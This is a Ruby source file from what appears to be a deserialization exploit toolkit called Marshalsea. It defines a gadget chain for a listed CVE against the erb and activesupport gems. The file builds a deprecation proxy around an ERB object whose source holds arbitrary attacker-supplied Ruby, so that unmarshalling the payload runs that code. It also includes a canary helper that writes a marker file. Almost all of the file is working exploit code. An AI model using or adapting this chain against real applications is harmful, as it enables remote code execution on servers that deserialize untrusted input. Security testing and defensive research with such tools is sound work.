# ©AngelaMos | 2026
# erb_def_module.rb
# frozen_string_literal: true

require "erb"

module Marshalsea
  module Chains
    class ErbDefModule < Base
      CHAIN_NAME = "erb-def-module"
      VECTOR = "hash"
      CVE = "CVE-2026-41316"
      TARGET_GEM = "erb"

      REQUIRES = ["activesupport"].freeze

      AFFECTED = [
        ["< 4.0.3.1"],
        ["= 4.0.4"],
        [">= 5.0.0", "< 6.0.1.1"],
        [">= 6.0.2", "< 6.0.4"]
      ].map { |constraints| constraints.map(&:freeze).freeze }.freeze

      PROXY_CLASS = "ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"
      DEPRECATOR_CLASS = "ActiveSupport::Deprecation"

      DISPATCH_METHOD = :def_module
      PROXY_LABEL = "@marshalsea"

      SRC_PREFIX = "#\nend\n"
      SRC_SUFFIX = "\ndef _marshalsea_unused\n"
      DEFAULT_FILENAME = "(erb)"
      DEFAULT_LINENO = 0

      IVAR_SRC = :@src
      IVAR_FILENAME = :@filename
      IVAR_LINENO = :@lineno
      IVAR_INSTANCE = :@instance
      IVAR_METHOD = :@method
      IVAR_VAR = :@var
      IVAR_DEPRECATOR = :@deprecator
      IVAR_SILENCED = :@silenced

      CANARY_TEMPLATE = "File.write(%<path>p, %<marker>p)"

      MISSING_DISPATCHER = "#{PROXY_CLASS} is not loaded; this chain needs activesupport".freeze

      SET_IVAR = Object.instance_method(:instance_variable_set).freeze

      METADATA = {
        name: CHAIN_NAME,
        vector: VECTOR,
        cve: CVE,
        gem: TARGET_GEM,
        affected: AFFECTED,
        kind: KIND_CHAIN,
        requires: REQUIRES
      }.freeze

      def self.metadata
        METADATA
      end

      def self.canary(path, marker)
        new(format(CANARY_TEMPLATE, path: path, marker: marker))
      end

      def self.dispatcher_available?
        dispatcher_class
        true
      rescue ChainError
        false
      end

      def self.dispatcher_class
        require "active_support"
        require "active_support/deprecation"
        Object.const_get(PROXY_CLASS)
      rescue LoadError, NameError
        raise ChainError, MISSING_DISPATCHER
      end

      def self.deprecator_class
        dispatcher_class
        Object.const_get(DEPRECATOR_CLASS)
      end

      def initialize(ruby_source)
        super()
        @ruby_source = ruby_source
      end

      def generate
        proxy = self.class.dispatcher_class.allocate
        SET_IVAR.bind_call(proxy, IVAR_INSTANCE, template)
        SET_IVAR.bind_call(proxy, IVAR_METHOD, DISPATCH_METHOD)
        SET_IVAR.bind_call(proxy, IVAR_VAR, PROXY_LABEL)
        SET_IVAR.bind_call(proxy, IVAR_DEPRECATOR, deprecator)
        proxy
      end

      def serialize
        in_hash_key_position(generate)
      end

      def template
        object = ERB.allocate
        object.instance_variable_set(IVAR_SRC, src)
        object.instance_variable_set(IVAR_FILENAME, DEFAULT_FILENAME)
        object.instance_variable_set(IVAR_LINENO, DEFAULT_LINENO)
        object
      end

      def deprecator
        silent = self.class.deprecator_class.allocate
        silent.instance_variable_set(IVAR_SILENCED, true)
        silent
      end

      def src
        "#{SRC_PREFIX}#{@ruby_source}#{SRC_SUFFIX}"
      end

      private

      attr_reader :ruby_source
    end
  end
end
